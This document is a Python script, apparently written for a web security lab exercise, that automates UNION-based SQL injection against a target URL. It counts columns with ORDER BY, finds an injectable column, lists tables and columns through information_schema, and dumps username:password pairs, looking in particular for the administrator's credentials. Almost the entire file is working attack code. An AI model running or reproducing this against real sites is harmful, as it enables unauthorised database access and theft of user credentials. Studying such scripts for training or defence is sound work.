#!/usr/bin/env python3
# Listing the database contents on NON-Oracle databases
import requests
import sys
import re
from bs4 import BeautifulSoup

# Debugging
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def get_col(url):
    for i in range(1,10):
        sqli = f"' ORDER BY {i}--"
        req = requests.get(url+sqli, verify=False, proxies=proxies)
        if "Internal Server Error" in req.text:
            return i-1
        i = i+1
    return False

def determined_col(url, number_col):
    for i in range(1,number_col+1):
        payload_list = ['NULL'] * number_col
        payload_list[i-1] = "'a'"
        sqli = f"' UNION SELECT {','.join(payload_list)}--"
        req = requests.get(url+sqli, verify=False, proxies=proxies)
        if "Internal Server Error" not in req.text:
            return sqli
    return False

def user_table(url, sqli):
    sqli1 = sqli.replace("'a'", "table_name")
    sqli2 = sqli1.replace("--", " FROM information_schema.tables--")
    # ' UNION SELECT table_name,NULL FROM information_schema.tables--
    req = requests.get(url+sqli2, verify=False, proxies=proxies)
    if "Internal Server Error" not in req.text:
        soup = BeautifulSoup(req.text, 'html.parser')
        result = soup.find(string=re.compile('.*users.*'))
        return result
    else:
        return False
    
def user_column(url, sqli, table_name):
    sqli1 = sqli.replace("'a'", "column_name")
    sqli2 = sqli1.replace("--", f" FROM information_schema.columns WHERE table_name = '{table_name}'--")
    # ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='user_abcde'--
    req = requests.get(url+sqli2, verify=False, proxies=proxies)
    if "Internal Server Error" not in req.text:
        soup = BeautifulSoup(req.text, 'html.parser')
        username = soup.find(string=re.compile('.*username.*'))
        password = soup.find(string=re.compile('.*password.*'))
        return username, password
    else:
        return False

def dump_creds(url, sqli, username_column, password_column, table_name):
    sqli1 = sqli.replace("'a'", f"{username_column} || ':' || {password_column}")
    sqli2 = sqli1.replace("--", f" FROM {table_name}--")
    # ' UNION SELECT username || ':' || password,NULL FROM table_name--
    req = requests.get(url+sqli2, verify=False, proxies=proxies)
    if "Internal Server Error" not in req.text:
        soup = BeautifulSoup(req.text, 'html.parser')
        dumping = soup.find(string=re.compile('administrator:[A-Za-z0-9]+'))
        return dumping
    else:
        return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: {} <url>".format(sys.argv[0]))
        print("[-] Usage: {} http://example.com".format(sys.argv[0]))

    num_col = get_col(url)
    if num_col:
        print("[-] The number of columns is...      [{}]".format(num_col))

        deter_col = determined_col(url, num_col)
        if deter_col:
            print("[-] Found the injectable columns...  [{}]".format(deter_col))

            listing_user_table = user_table(url, deter_col)
            if listing_user_table:
                print("[-] Found the users table_name...    [{}]".format(listing_user_table))

                username_column, password_column = user_column(url, deter_col, listing_user_table)
                if username_column and password_column:
                    print("[-] Found the username_column...     [{}]".format(username_column))
                    print("[-] Found the password_column...     [{}]".format(password_column))

                    dump = dump_creds(url, deter_col, username_column, password_column, listing_user_table)
                    if dump:
                        print("[-] Found the superuser creds...     [{}]".format(dump))
                    else:
                        print("[-] Can't dump the credentials!")
                else:
                    print("[-] Can't find the users column!")
            else:
                print("[-] Can't find the users table!")
        else:
            print("[-] Can't find injectable column!")
    else:
        print("[-] SQLi not successful!")